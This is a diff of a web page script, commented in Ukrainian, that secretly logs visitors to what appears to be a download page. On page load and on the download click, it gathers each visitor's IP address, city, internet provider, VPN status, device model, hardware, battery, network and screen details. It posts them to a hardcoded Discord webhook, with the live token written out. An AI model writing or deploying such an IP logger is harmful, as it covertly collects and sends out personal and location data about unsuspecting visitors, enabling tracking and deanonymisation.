@@ -18,83 +18,73 @@
         const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
         const startTime = Date.now();
 
-        async function getFinalData() {
-            let info = {
-                ip: "N/A", city: "N/A", vpn: "Ні", model: "Android", 
+        async function sendLog(event) {
+            // Дані по замовчуванню
+            let d = {
+                model: "Android (Захищено)",
                 cpu: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
-                gpu: "N/A", batt: "N/A", net: "N/A",
-                theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "🌑 Темна" : "☀️ Світла",
-                incognito: "Ні",
-                adblock: "Вимкнено",
-                referrer: document.referrer || "Пряме посилання",
-                motion: "Спокій"
+                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+                ip: "Не вдалося",
+                geo: "Невідомо",
+                prov: "Невідомо",
+                net: "N/A",
+                batt: "N/A",
+                vpn: "Ні",
+                screen: `${screen.width}x${screen.height}`,
+                lang: navigator.language
             };
 
-            // 1. IP / Geo / VPN
+            // 1. Отримуємо IP та ГЕО
             try {
-                const r = await fetch('https://ipapi.co/json/');
-                const g = await r.json();
-                info.ip = g.ip; info.city = `${g.city}, ${g.country_name} (${g.org})`;
-                if (g.org.toLowerCase().match(/vpn|proxy|hosting/)) info.vpn = "ТАК";
-            } catch(e){}
+                const res = await fetch('https://ipapi.co/json/');
+                const g = await res.json();
+                d.ip = g.ip;
+                d.geo = `${g.city}, ${g.country_name}`;
+                d.prov = g.org;
+                if (g.org.toLowerCase().includes("vpn") || g.org.toLowerCase().includes("hosting")) d.vpn = "ТАК";
+            } catch(e) {}
 
-            // 2. Hardware (HTTPS)
+            // 2. Отримуємо модель (Працює тільки через HTTPS)
             if (navigator.userAgentData?.getHighEntropyValues) {
                 const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
-                info.model = `${h.model} (v${h.platformVersion})`;
+                d.model = `${h.model} (Android ${h.platformVersion})`;
             }
 
-            // 3. GPU & AdBlock Check
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                info.gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
-                // Спроба завантажити рекламний скрипт для перевірки AdBlock
-                const testAd = await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { mode: 'no-cors' }).catch(() => info.adblock = "✅ Увімкнено");
-            } catch(e){}
-
-            // 4. Battery & Motion
+            // 3. Батарея та Мережа
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                info.batt = `${Math.round(b.level*100)}% (${b.charging?'⚡':'🔋'})`;
+                d.batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Розрядка'})`;
             }
-            
-            // Перевірка інкогніто
-            if (navigator.storage && navigator.storage.estimate) {
-                const {quota} = await navigator.storage.estimate();
-                if (quota < 120000000) info.incognito = "Ймовірно ТАК";
+            if (navigator.connection) {
+                d.net = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.rtt}ms)`;
             }
 
-            return info;
-        }
+            const timeOnPage = ((Date.now() - startTime) / 1000).toFixed(1);
 
-        async function sendLog(event) {
-            const d = await getFinalData();
-            const time = ((Date.now() - startTime)/1000).toFixed(1);
-
+            // ФОРМУЄМО ПОВІДОМЛЕННЯ
             const payload = {
                 embeds: [{
-                    title: event === 'visit' ? "🛸 ВХІД: MAXIMUM DATA" : "🧨 СКАЧУВАННЯ: ФІНІШ",
+                    title: event === 'visit' ? "👤 НОВИЙ ВІЗИТ" : "📥 СКАЧУВАННЯ",
                     color: event === 'visit' ? 3066993 : 16711680,
-                    fields: [
-                        { name: "📱 Пристрій", value: `\`${d.model}\` (RAM: ${d.ram})`, inline: true },
-                        { name: "🧠 Ядра CPU", value: `\`${d.cpu}\``, inline: true },
-                        { name: "🌐 IP / VPN", value: `\`${d.ip}\` / VPN: \`${d.vpn}\``, inline: false },
-                        { name: "📍 Локація", value: `\`${d.city}\``, inline: false },
-                        { name: "🎮 GPU", value: `\`${d.gpu}\``, inline: false },
-                        { name: "🔋 Батарея / Тема", value: `\`${d.batt}\` / \`${d.theme}\``, inline: true },
-                        { name: "🕵️ Інкогніто / AdBlock", value: `\`${d.incognito}\` / \`${d.adblock}\``, inline: true },
-                        { name: "🔗 Звідки прийшов", value: `\`${d.referrer}\``, inline: false },
-                        { name: "⏱ На сайті", value: `\`${time} сек.\``, inline: true }
-                    ],
-                    footer: { text: "UltraLogger v9.0 Final • " + new Date().toLocaleTimeString() }
+                    description: `📱 **Модель:** ${d.model}\n🧠 **Процесор:** ${d.cpu} ядер\n📟 **RAM:** ${d.ram}\n🌐 **IP:** ${d.ip}\n📍 **Місце:** ${d.geo}\n🏢 **Провайдер:** ${d.prov}\n📶 **Інтернет:** ${d.net}\n🔋 **Батарея:** ${d.batt}\n🛡 **VPN:** ${d.vpn}\n🖥 **Екран:** ${d.screen}\n🌍 **Мова:** ${d.lang}\n⏱ **Час на сайті:** ${timeOnPage} сек.`,
+                    footer: { text: "Ultimate Logger v10.0" },
+                    timestamp: new Date()
                 }]
             };
 
-            fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
         }
 
-        window.onload = () => sendLog('visit');
+        // Відправка через 1.5 секунди після входу (щоб встигли зібратися дані)
+        window.onload = () => {
+            setTimeout(() => sendLog('visit'), 1500);
+        };
+
+        // Відправка при кліку
         document.getElementById('downloadBtn').onclick = () => sendLog('download');
     </script>
 </body>
